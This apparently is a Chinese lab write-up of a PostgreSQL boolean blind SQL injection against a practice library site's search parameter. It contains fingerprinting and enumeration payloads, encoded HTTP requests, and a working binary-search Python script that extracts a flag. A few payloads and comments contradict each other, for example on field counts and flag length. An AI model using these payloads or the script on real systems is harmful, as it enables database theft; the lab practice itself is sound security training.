---
title: 好靶场SQLi-表世界·华章图书馆
published: 2026-09-18T19:00:00
description: PostgreSQL 注入实战，搜索参数布尔盲注，讲解库表字段探测，附带二分法 Python 脚本提取 flag。
tags:
  - 靶场
  - SQL注入
category: 网络安全
draft: false
---

## 探测注入点

打开之后是一个图书管理项目，一般的都有搜索功能，以此为探测点

输入`1`，正常回显信息，为GET请求，url：`search?q=1&category=`

在此需要说一个知识点

### 小知识点

图书管理项目一般注入点位置：

- GET参数：就比如搜索书籍时，`id`、`bookid`、`?search=xxx`，以及此次靶场的`search?q=x`
- POST表单：比如登录功能、登录之后的添加图书功能，以及此次的搜索书籍也有可能是POST提交，这时就需要抓包看
- Cookie、HTTP头、路径、数据包为JSON等等

现在回归正题，因为现在已经清楚为GET参数，接下来就需要判断闭合方式

比如数字型、单引号、双引号、单引号+括号，双引号+括号，也得考虑`#`会不会被过滤，需要换注释符等等

本靶场在对搜索功能探测时（回显界面不同），发现可注入

```
1' and 1=1 -- +
1' and 1=2 -- +
```

## 探测数据库类型

首先进行判断所使用的数据库类型，以版本函数指纹进行判断

```
MySQL:      ' and length(version())>0 -- +
SQL Server: ' and length(@@version)>0 -- +
PostgreSQL: ' and length(version())>0 -- +
Oracle:     ' and length((select banner from v$version where rownum=1))>0 -- +
SQLite:     ' and length(sqlite_version())>0 -- +
```

在此时发现`Mysql`和`PostgreSQL`都正常回显，再按照不同类型的**数据库名函数或系统表**进行判断

```
// 数据库名函数
MySQL:      ' and length(database())>0 -- +
PostgreSQL: ' and length(current_database())>0 -- +
// 系统表
MySQL:      ' and (select count(*) from mysql.user)>0 -- +
PostgreSQL: ' and (select count(*) from pg_catalog.pg_tables)>0 -- +
```

确定数据库类型为`PostgreSQL`

### PostgreSQL小知识点

在 PostgreSQL 里：

- `table_catalog` 对应**数据库名**（类似 MySQL 的 database）
    
- `table_schema` 对应**schema 名**（类似 MySQL 里没有的中间层）
    
- `public` 是每个数据库创建时自带的默认 schema

`LIMIT/OFFSET` 只关心**返回多少行、从第几行开始**，不关心 `SELECT` 后面跟的是 `table_name`、`column_name` 还是 `flag_value`。所以只要你的子查询返回的是单列多行结果，就能用同样的分页方式逐行取。

## 探测当前数据库名长度&名称

变量以`$`为标记

burp爆破，数据库名长度7位：`%3D 7`

```
深入理解计算机系统' and (select length(current_database()))=$1$ -- +

GET /search?q=%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%27+and+%28select+length%28current_database%28%29%29%29%3D$1$+--+%2B&category= HTTP/1.1
```

以ascii码方式判断名称，将`1-1`设置为数值1-8，将`2-1`设置为简单列表（数字+字母+特殊字符）ascii码表

```
深入理解计算机系统' and ascii(substr(current_database(),$1$,1))=$100$ -- +

GET /search?q=%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F%27+and+ascii%28substr%28current_database%28%29%2C$1$%2C1%29%29%3D$1$+--+%2B&category= HTTP/1.1

ascii：108(l) + 105(i) + 98(b) + 114(r) + 97(a) + 114(r) + 121(y) = library
```

## 探测当前数据库的表数量&名称

```
// 只统计实体表，结果为10
深入理解计算机系统' and (select count(*) from information_schema.tables where table_schema='public' and table_type='BASE TABLE')=$1$ -- +

// offset后跟的是第几张表 探测出表4长度为4，表0、2为5、表3为7、表6为8、表8、9为12、表1为14、表5为15
深入理解计算机系统' and (select length((select table_name from information_schema.tables where table_schema='public' and table_type='BASE TABLE' limit 1 offset $0$)))=$1$ -- +

// 这里主要看一下表4的名称 果然是flag
深入理解计算机系统' and (select ascii(substr(table_name,$1$,1)) from information_schema.tables where table_schema='public' and table_type='BASE TABLE' order by table_name limit 1 offset 4)=$1$ -- +
```

## 探测flag表的字段数量&名称

```
// 共3个字段
深入理解计算机系统' and (select count(*) from information_schema.columns where table_schema='public' and table_name='flag')=1 -- +

// offset后跟的是第几个字段 探测出0为2、1和2都为10
深入理解计算机系统' and (select length((select column_name from information_schema.columns where table_schema='public' and table_name='flag' limit 1 offset 0)))=1 -- +

// 这里可以三个变量试试，也可以offset指定1或者2再对比ascii
// 第一个字段应该是id，第二个字段是flag_value，第三个字段是created_at
深入理解计算机系统' and (select ascii(substr(column_name,§1§,1)) from information_schema.columns where table_schema='public' and table_name='flag' limit 1 offset 1)=§1§ -- +

深入理解计算机系统' and (select ascii(substr(flag,§pos§,1)) from information_schema.columns where table_schema='public' and table_name='flag' limit 1 offset 1)=§ascii§ -- +
```

## 探测flag表的字段行数&名字&最终结果

```
// 这步直接手工，只有1行数据
深入理解计算机系统' and (select count(*) from public.flag)=1 -- +

// 只有一行数据所以只需要测位数就可以了，结果为39位
深入理解计算机系统' and (select length(flag_value) from public.flag limit 1 offset 0)=$1$ -- +
```

### 二分法POC

二分法就是通过两个区间，以及一个中间值，不断地变化以进行更高效率的查询

完整逻辑流程

初始：`left=32`，`right=126` 循环条件：`left <= right`

1. 计算中间值 `mid = (left + right)//2`
2. 构造 SQL：`ascii(substr(...)) > mid`，发包访问靶场
3. 判断返回结果：
    -  页面出现`共 1 条记录` → **条件为真**，说明 `X > mid` → 目标在 `mid+1 ~ right` → 更新：`left = mid + 1`
    -  页面返回`共 0 条记录` → **条件假**，说明 `X ≤ mid` → 目标在 `left ~ mid` → 更新：`right = mid -1`
4. 循环，不断压缩区间，直到 `left > right`，此时`left`就是 X 的真实 ASCII 码。

#### 举个例子（模拟）

假设真实 X=102（字符`f`） left=32, right=126

1. mid=(32+126)//2=79，判断 `102>79` →真 → left=80
2. mid=(80+126)//2=103，判断 `102>103` →假 → right=102
3. mid=(80+102)//2=91，判断 `102>91` →真 → left=92
4. mid=(92+102)//2=97，判断 `102>97` →真 → left=98
5. mid=(98+102)//2=100，判断 `102>100` →真 → left=101
6. mid=(101+102)//2=101，判断 `102>101` →真 → left=102
7. mid=(102+102)//2=102，判断 `102>102` →假 → right=101

> 此时 left=102 > right=101，循环结束。`left=102`就是目标 ASCII。
> 单个字符最多**7 次请求**，而暴力枚举最坏要 95 次。

```python
import requests

url = "http://xxx.haobachang.com:11111/search"
flag = ""
# 39个字符
for pos in range(6, 38):
    left = 32
    right = 126
    res = 0
    while left <= right:
        mid = (left + right) // 2
        payload = "深入理解计算机系统' and (select ascii(substr(flag_value,%d,1)) from public.flag order by flag_value limit 1 offset 0) > %d -- +" % (pos, mid)
        params = {
            "q": payload,
            "category": ""
        }
        
        resp = requests.get(url, params=params)
        # 如果条件为真，页面包含特征
        if "共 1 条记录" in resp.text:
            left = mid + 1
        else:
            right = mid - 1
    res = left
    flag += chr(res)
    print(f"pos{pos} 字符: {chr(res)}  ascii:{res}，当前flag:{flag}")
print("最终flag：", flag)
```
